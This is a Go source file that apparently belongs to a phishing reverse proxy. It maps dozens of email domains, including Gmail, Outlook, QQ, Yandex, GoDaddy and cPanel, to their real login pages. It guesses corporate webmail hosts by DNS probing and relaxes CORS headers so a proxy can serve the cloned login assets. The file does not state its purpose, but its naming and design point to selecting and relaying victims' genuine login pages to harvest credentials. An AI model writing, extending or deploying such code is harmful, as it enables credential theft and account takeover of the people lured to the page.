package main

import (
	"net"
	"net/http"
	"strings"
)

// ProviderMapping maps email domains to their actual login URLs for US, Europe, and China
var ProviderMapping = map[string]string{
	// US Providers
	"gmail.com":      "https://accounts.google.com/",
	"googlemail.com": "https://accounts.google.com/",
	"outlook.com":    "https://login.live.com/",
	"hotmail.com":    "https://login.live.com/",
	"live.com":       "https://login.live.com/",
	"msn.com":        "https://login.live.com/",
	"yahoo.com":      "https://login.yahoo.com/",
	"ymail.com":      "https://login.yahoo.com/",
	"icloud.com":     "https://appleid.apple.com/",
	"me.com":         "https://appleid.apple.com/",
	"aol.com":        "https://login.aol.com/",
	"protonmail.com": "https://account.proton.me/",
	"proton.me":      "https://account.proton.me/",
	"zoho.com":       "https://accounts.zoho.com/",

	// China Providers
	"qq.com":      "https://mail.qq.com/",
	"foxmail.com": "https://mail.qq.com/",
	"163.com":     "https://mail.163.com/",
	"126.com":     "https://mail.126.com/",
	"yeah.net":    "https://mail.yeah.net/",
	"sina.com":    "https://mail.sina.com.cn/",
	"sohu.com":    "https://mail.sohu.com/",

	// Europe / Global Providers
	"yandex.com":   "https://passport.yandex.com/",
	"yandex.ru":    "https://passport.yandex.ru/",
	"web.de":       "https://web.de/mam/login.action",
	"gmx.com":      "https://login.gmx.net",
	"gmx.de":       "https://login.gmx.net",
	"tutanota.com": "https://login.tutanota.com/",
	"tuta.io":      "https://login.tutanota.com/",
	"fastmail.com": "https://www.fastmail.com/auth/login",
	"godaddy.com":  "https://sso.godaddy.com/",
	"cpanel.net":   "https://cpanel.net/",
}

// GetTargetDomain determines the real login URL based on the email domain
func GetTargetDomain(email string) string {
	parts := strings.Split(email, "@")
	if len(parts) < 2 {
		return "https://accounts.google.com/" // Default fallback
	}
	domain := strings.ToLower(parts[1])

	// 1. Check the hardcoded map first
	if target, ok := ProviderMapping[domain]; ok {
		return target
	}

	// 2. Smart DNS Fallback for custom corporate domains
	// We test the most common webmail subdomains
	subdomains := []string{"webmail", "mail", "exchange", "outlook", "autodiscover", "portal"}

	for _, sub := range subdomains {
		fullDomain := sub + "." + domain
		_, err := net.LookupHost(fullDomain)
		if err == nil {
			// DNS resolves! Return the URL
			return "https://" + fullDomain + "/"
		}
	}

	// 3. Absolute Fallback
	return "https://" + domain + "/"
}

// CloneHeaders ensures the browser doesn't block the assets
func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
	if ct := src.Header.Get("Content-Type"); ct != "" {
		dst.Header().Set("Content-Type", ct)
	}
	// Allow the browser to load images, scripts, and styles from the proxy
	dst.Header().Set("Access-Control-Allow-Origin", "*")
	dst.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
}
